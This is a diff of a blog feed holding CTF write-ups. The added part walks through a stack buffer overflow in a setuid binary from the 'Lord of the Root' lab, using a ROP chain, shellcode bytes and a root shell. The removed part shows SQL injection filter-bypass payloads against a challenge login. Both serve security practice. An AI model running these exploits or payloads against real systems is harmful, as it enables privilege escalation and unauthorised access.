+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>objdump -d -M intel --no-show-raw-insn /SECRET/door3/file <span class="p">|</span>less
+</span><span class='line'>
+</span><span class='line'>0804845d &lt;main&gt;:
+</span><span class='line'> 804845d:       push   ebp
+</span><span class='line'> 804845e:       mov    ebp,esp
+</span><span class='line'> 8048460:       and    esp,0xfffffff0
+</span><span class='line'> 8048463:       sub    esp,0xb0
+</span><span class='line'> 8048469:       cmp    DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>,0x1
+</span><span class='line'> 804846d:       jg     <span class="m">8048490</span> &lt;main+0x33&gt;
+</span><span class='line'> 804846f:       mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+</span><span class='line'> 8048472:       mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'> 8048474:       mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span><span class='line'> 8048478:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048540
+</span><span class='line'> 804847f:       call   <span class="m">8048310</span> &lt;<span class="nb">printf</span>@plt&gt;
+</span><span class='line'> 8048484:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
+</span><span class='line'> 804848b:       call   <span class="m">8048340</span> &lt;<span class="nb">exit</span>@plt&gt;
+</span><span class='line'> 8048490:       mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+</span><span class='line'> 8048493:       add    eax,0x4
+</span><span class='line'> 8048496:       mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'> 8048498:       mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span><span class='line'> 804849c:       lea    eax,<span class="o">[</span>esp+0x11<span class="o">]</span>
+</span><span class='line'> 80484a0:       mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 80484a3:       call   <span class="m">8048320</span> &lt;strcpy@plt&gt;
+</span><span class='line'> 80484a8:       mov    eax,0x0
+</span><span class='line'> 80484ad:       leave
+</span><span class='line'> 80484ae:       ret
+</span><span class='line'> 80484af:       nop
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I quickly found that I had to run the binary with the first argument containing 171 chars + EIP to overwrite the saved return address on the stack. Let&rsquo;s see how we can spawn a shell&hellip;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -q ./door3
+</span><span class='line'>Reading symbols from /home/bas/downloads/LotR/door3...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : disabled
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Okay, so no protections whatsoever. We could place shellcode on the stack and pwn like it&rsquo;s 1999.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*171+&quot;BBBBCCCC&quot;&#39;</span><span class="k">)</span>
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0x0
+</span><span class='line'>EBX: 0xf7fbeff4 --&gt; 0x15fd7c
+</span><span class='line'>ECX: 0x0
+</span><span class='line'>EDX: 0xb4
+</span><span class='line'>ESI: 0x0
+</span><span class='line'>EDI: 0x0
+</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
+</span><span class='line'>ESP: 0xffffd530 <span class="o">(</span><span class="s2">&quot;CCCC&quot;</span><span class="o">)</span>
+</span><span class='line'>EIP: 0x42424242 <span class="o">(</span><span class="s1">&#39;BBBB&#39;</span><span class="o">)</span>
+</span><span class='line'>EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x42424242
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xffffd530 <span class="o">(</span><span class="s2">&quot;CCCC&quot;</span><span class="o">)</span>
+</span><span class='line'>0004<span class="p">|</span> 0xffffd534 --&gt; 0xffffd500 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">44</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;BBBBCCCC&quot;</span><span class="o">)</span>
+</span><span class='line'>0008<span class="p">|</span> 0xffffd538 --&gt; 0xffffd5e0 --&gt; 0xffffd7e5 <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-bas&quot;</span><span class="o">)</span>
+</span><span class='line'>0012<span class="p">|</span> 0xffffd53c --&gt; 0xf7fde860 --&gt; 0xf7e5f000 --&gt; 0x464c457f
+</span><span class='line'>0016<span class="p">|</span> 0xffffd540 --&gt; 0xf7ff4821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
+</span><span class='line'>0020<span class="p">|</span> 0xffffd544 --&gt; 0xffffffff
+</span><span class='line'>0024<span class="p">|</span> 0xffffd548 --&gt; 0xf7ffcff4 --&gt; 0x1cf2c
+</span><span class='line'>0028<span class="p">|</span> 0xffffd54c --&gt; 0x8048249 <span class="o">(</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>
+</span><span class='line'>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s just jump to the stack! However, there is no <code>jmp esp</code> opcode in the binary, so it looks like we have a problem. ASLR <em>is</em> enabled on the remote box and none of the registers point directly to the &ldquo;shellcode&rdquo; on the stack. We can hardcode the stack address but that will lead to lots of failed attempts. Let&rsquo;s be smart about this.</p>
+
+<p>Verify no <code>jmp esp</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>asmsearch <span class="s2">&quot;jmp esp&quot;</span>
+</span><span class='line'>Searching <span class="k">for</span> ASM code: <span class="s1">&#39;jmp esp&#39;</span> in: binary ranges
+</span><span class='line'>0x08048365 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
+</span><span class='line'>0x08048460 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
+</span><span class='line'>0x08048c1b : <span class="o">(</span>00e4<span class="o">)</span> add    ah,ah
+</span><span class='line'>0x08049365 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
+</span><span class='line'>0x08049460 : <span class="o">(</span>83e4<span class="o">)</span> and    esp,0xfffffff0
+</span><span class='line'>gdb-peda<span class="nv">$ </span>asmsearch <span class="s2">&quot;call esp&quot;</span>
+</span><span class='line'>Searching <span class="k">for</span> ASM code: <span class="s1">&#39;call esp&#39;</span> in: binary ranges
+</span><span class='line'>0x0804864f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
+</span><span class='line'>0x08048a6f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
+</span><span class='line'>0x08048a73 : <span class="o">(</span>08d4<span class="o">)</span> or     ah,dl
+</span><span class='line'>0x08048e0f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
+</span><span class='line'>0x0804964f : <span class="o">(</span>00d4<span class="o">)</span> add    ah,dl
+</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xd4&quot;</span> binary
+</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;\xff\xd4&#39;</span> in: binary ranges
+</span><span class='line'>Not found
+</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;\xff\xe4&quot;</span> binary
+</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;\xff\xe4&#39;</span> in: binary ranges
+</span><span class='line'>Not found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, we do have <code>strcpy</code> and this memory region:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
+</span><span class='line'>Start      End        Perm    Name
+</span><span class='line'>0x08048000 0x08049000 r-xp    /home/bas/downloads/LotR/door3
+</span><span class='line'>0x08049000 0x0804a000 rwxp    /home/bas/downloads/LotR/door3
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0x08049000</code> is <code>rwx</code>! We can now use <code>strcpy</code> to write <code>ff e4</code> to memory and return to it, which bypasses ASLR because the binary is always loaded on the same address. Let&rsquo;s ROP this! <code>strcpy@plt</code> is at 0x8048320 but we can&rsquo;t use that address because it contains a space. We&rsquo;ll just use strcpy+6, which jumps to the resolver to resolve strcpy.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/4i 0x8048320
+</span><span class='line'>   0x8048320 &lt;strcpy@plt&gt;:  jmp    DWORD PTR ds:0x8049740
+</span><span class='line'>   0x8048326 &lt;strcpy@plt+6&gt;:    push   0x8
+</span><span class='line'>   0x804832b &lt;strcpy@plt+11&gt;:   jmp    0x8048300
+</span><span class='line'>   0x8048330 &lt;__gmon_start__@plt&gt;:  jmp    DWORD PTR ds:0x8049744
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With that out of the way, we need a pop2ret to balance the stack. This is easily located with gdb-peda&rsquo;s <code>ropgadget</code> command and I chose 0x804850e. Last thing I needed was the address of the bytes <code>0xff</code> and <code>0xe4</code> and again gdb-peda provided those. Putting the ROP chain together:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
+</span><span class='line'>  <span class="c"># strcpy(dest, src)</span>
+</span><span class='line'>  <span class="c"># use strcpy+6 otherwise the address will contain a space, messes up argv</span>
+</span><span class='line'>  <span class="c"># second address is pop2ret</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048326</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804850e</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">where</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">what</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'><span class="n">z</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">171</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">write</span><span class="p">(</span><span class="mh">0x804852c</span><span class="p">,</span> <span class="mh">0x8049330</span><span class="p">)</span> <span class="c"># ff</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">write</span><span class="p">(</span><span class="mh">0x8048366</span><span class="p">,</span> <span class="mh">0x8049331</span><span class="p">)</span> <span class="c"># e4 jmp esp</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049330</span><span class="p">)</span>
+</span><span class='line'><span class="c"># modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">z</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Death to nopsleds!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>md5sum /SECRET/door*/file
+</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door1/file
+</span><span class='line'>bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door2/file
+</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door3/file
+</span><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>/SECRET/door2/file <span class="k">$(</span>python poc.py<span class="k">)</span>
+</span><span class='line'><span class="c"># whoami</span>
+</span><span class='line'>root
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And there you go. A reliable way to spawn a root shell from that vulnerable binary. Game over.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/Flag*</span>
+</span><span class='line'><span class="s2">&quot;There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.&quot;</span>
+</span><span class='line'>– Gandalf
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
@@ -7527,76 +8177,6 @@ The challenge already said that the flag needed a bit more work. Indeed, <code>f
 <p><img src="http://barrebas.github.io/assets/legitbs/r0pbaby.png" alt="" /></p>
 
 <p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
-    <updated>2015-04-02T20:10:52+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
-    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>
-
-<!-- more -->
-
-
-<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>
-
-<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl http://hack.bckdr.in/JUDGE/index.php --data <span class="s2">&quot;username=testz0r&#39; or &#39;a&#39;=&#39;a&amp;password=testz0r&quot;</span>
-</span><span class='line'>&lt;!DOCTYPE html&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;html&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;head&gt;
-</span><span class='line'>&lt;title&gt;Login&lt;/title&gt;
-</span><span class='line'>&lt;/head&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;body&gt;
-</span><span class='line'>An Error occured
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl http://hack.bckdr.in/JUDGE/index.php --data <span class="s2">&quot;username=admin&#39;||&#39;1&amp;password=testz0r&quot;</span>
-</span><span class='line'>&lt;!DOCTYPE html&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;html&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;head&gt;
-</span><span class='line'>&lt;title&gt;Login&lt;/title&gt;
-</span><span class='line'>&lt;/head&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;body&gt;
-</span><span class='line'>Flag is <span class="o">[</span>REDACTED<span class="o">]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Done! One filter bypass was all it took.</p>
 ]]></content>
   </entry>
   
